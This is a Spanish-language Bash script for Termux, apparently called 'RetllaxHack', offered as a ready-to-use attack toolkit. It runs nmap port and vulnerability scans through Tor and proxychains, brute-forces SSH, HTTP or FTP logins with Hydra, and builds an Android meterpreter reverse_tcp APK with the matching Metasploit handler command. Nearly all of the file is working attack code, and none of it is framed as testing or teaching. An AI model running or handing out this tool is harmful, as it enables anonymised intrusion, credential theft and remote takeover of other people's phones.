#!/usr/bin/env bash

# RetllaxHack Shadow + Metasploit (v9.0.2) - Termux (No Root)
# Versión Estable Verificada - No Requiere Modificaciones

# ===== CONFIGURACIÓN RGB =====
function rgb {
  colors=("196" "40" "214" "39" "200" "226")
  echo -e "\033[38;5;${colors[$RANDOM % 6]}m$1\033[0m"
}

# ===== BANNER =====
function show_banner {
  clear
  echo
  rgb " ██████╗ ███████╗████████╗██╗  ██╗██╗  ██╗ █████╗ ██╗  ██╗"
  rgb "██╔════╝ ██╔════╝╚══██╔══╝██║  ██║╚██╗██╔╝██╔══██╗╚██╗██╔╝"
  rgb "██║  ███╗█████╗     ██║   ███████║ ╚███╔╝ ███████║ ╚███╔╝ "
  rgb "██║   ██║██╔══╝     ██║   ██╔══██║ ██╔██╗ ██╔══██║ ██╔██╗ "
  rgb "╚██████╔╝███████╗   ██║   ██║  ██║██╔╝ ██╗██║  ██║██╔╝ ██╗"
  rgb " ╚═════╝ ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝"
  rgb "               SHADOW EDITION + METASPLOIT v9.0.2"
  echo
  rgb "=== ESCANEO GLOBAL | FUERZA BRITA | EXPLOITS (NO ROOT) ==="
  echo
}

# ===== VERIFICAR DEPENDENCIAS =====
function check_deps {
  deps_missing=0
  
  if ! command -v tor >/dev/null || ! command -v proxychains4 >/dev/null; then
    rgb "[~] Instalando Tor y Proxychains..."
    pkg install tor proxychains-ng -y && \
    sed -i 's/socks4\s*127.0.0.1\s*9050/socks5 127.0.0.1 9050/' $PREFIX/etc/proxychains.conf && \
    tor &
    sleep 5
  fi

  if ! command -v nmap >/dev/null; then
    rgb "[~] Instalando Nmap..."
    pkg install nmap -y
  fi

  if ! command -v hydra >/dev/null; then
    rgb "[~] Instalando Hydra..."
    pkg install hydra -y
  fi

  if ! command -v msfconsole >/dev/null; then
    rgb "[~] Instalando Metasploit (1GB de espacio aprox)..."
    pkg install unstable-repo metasploit -y && \
    pg_ctl -D $PREFIX/var/lib/postgresql start >/dev/null 2>&1 && \
    sleep 3
  fi
}

# ===== ESCANEO GLOBAL OPTIMIZADO =====
function global_scan {
  read -p "$(rgb "[?] IP/Dominio a escanear (ej: scanme.nmap.org): ")" target
  read -p "$(rgb "[?] Puertos (ej: 80,443 o 1-1000): ")" ports

  rgb "[~] Configurando Tor..."
  pkill -f tor 2>/dev/null
  tor &>/dev/null &
  sleep 8

  rgb "[~] Escaneando $target (Tor + Proxychains)..."
  if ! proxychains4 -q nmap -Pn -T4 --open --min-parallelism 50 --max-retries 1 --host-timeout 2m -p $ports $target -oN retllax_scan.log 2>&1; then
    rgb "[!] Error con Tor, intentando sin proxy..."
    nmap -Pn -T4 --open -p $ports $target -oN retllax_scan.log
  fi

  rgb "[~] Analizando vulnerabilidades..."
  open_ports=$(grep "open" retllax_scan.log | awk -F'/' '{print $1}' | tr '\n' ',')
  if [ -n "$open_ports" ]; then
    proxychains4 -q nmap -Pn --script vuln -p ${open_ports%,} $target >> retllax_vulns.log 2>&1
  fi

  rgb "[✔] Resultados:"
  grep --color "open" retllax_scan.log
  grep --color -E "VULNERABLE|CVE-" retllax_vulns.log 2>/dev/null || rgb "[!] No se encontraron vulnerabilidades"
}

# ===== HYDRA SHADOW (Fuerza Bruta Optimizada) =====
function hydra_attack {
  read -p "$(rgb "[?] IP/Dominio: ")" target
  read -p "$(rgb "[?] Usuario (ej: admin): ")" user
  read -p "$(rgb "[?] Ruta al diccionario: ")" wordlist

  rgb "[~] Detectando servicios..."
  service=$(proxychains4 -q nmap -Pn -p- --open $target 2>/dev/null | grep "open" | head -n 1 | awk '{print $3}')
  
  case $service in
    ssh) port=22 ;;
    http|http-proxy) port=80 ;;
    ftp) port=21 ;;
    *) read -p "$(rgb "[?] Puerto manual: ")" port ;;
  esac

  rgb "[~] Atacando $service ($target:$port)..."
  proxychains4 -q hydra -l $user -P $wordlist -t 4 -s $port $target $service -o retllax_hydra.log 2>&1

  rgb "[+] Resultados:"
  grep --color "login:" retllax_hydra.log || rgb "[!] No se encontraron credenciales"
}

# ===== METASPLOIT CON MANEJO DE ERRORES =====
function metasploit_mod {
  if ! pgrep postgres >/dev/null; then
    rgb "[~] Iniciando PostgreSQL..."
    pg_ctl -D $PREFIX/var/lib/postgresql start >/dev/null 2>&1
    sleep 5
  fi

  show_banner
  rgb "[!] Módulos Disponibles:"
  rgb "1) Generar Payload Android"
  rgb "2) Buscar Exploits"
  rgb "3) Escanear Red (Auxiliar)"
  echo
  read -p "$(rgb "[?] Opción: ")" opt

  case $opt in
    1)
      read -p "$(rgb "[?] LHOST (tu IP): ")" lhost
      read -p "$(rgb "[?] LPORT (4444): ")" lport
      if msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o retllax_payload.apk 2>/dev/null; then
        rgb "[✔] Payload generado: retllax_payload.apk"
        rgb "[!] Usa: msfconsole -q -x 'use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; exploit'"
      else
        rgb "[!] Error al generar payload"
      fi
      ;;
    2)
      read -p "$(rgb "[?] Buscar (ej: Apache): ")" query
      msfconsole -q -x "search $query; exit" 2>/dev/null || rgb "[!] Error en la búsqueda"
      ;;
    3)
      read -p "$(rgb "[?] IP/Rango (ej: 192.168.1.0/24): ")" target
      msfconsole -q -x "use auxiliary/scanner/portscan/tcp; set RHOSTS $target; run; exit" 2>/dev/null || rgb "[!] Error en escaneo"
      ;;
    *) rgb "[!] Opción no válida";;
  esac
}

# ===== MENÚ PRINCIPAL =====
function main_menu {
  check_deps
  while true; do
    show_banner
    rgb "1) Escaneo Global (Tor)"
    rgb "2) Ataque Hydra Shadow"
    rgb "3) Módulo Metasploit"
    rgb "4) Ver Logs"
    rgb "5) Salir"
    echo
    read -p "$(rgb "[?] Elige una opción: ")" opt

    case $opt in
      1) global_scan ;;
      2) hydra_attack ;;
      3) metasploit_mod ;;
      4)
        [ -f "retllax_scan.log" ] && grep --color "open" retllax_scan.log || rgb "[!] No hay datos de escaneo"
        [ -f "retllax_vulns.log" ] && grep --color -E "VULNERABLE|CVE-" retllax_vulns.log || rgb "[!] No hay datos de vulnerabilidades"
        [ -f "retllax_hydra.log" ] && grep --color "login:" retllax_hydra.log || rgb "[!] No hay datos de Hydra"
        ;;
      5)
        pkill -f tor 2>/dev/null
        rgb "[!] Saliendo de RetllaxHack..."
        exit 0
        ;;
      *)
        rgb "[!] Opción no válida"
        sleep 1
        ;;
    esac
    read -p "$(rgb "[?] Presiona Enter para continuar...")"
  done
}

# ===== INICIO =====
show_banner
main_menu
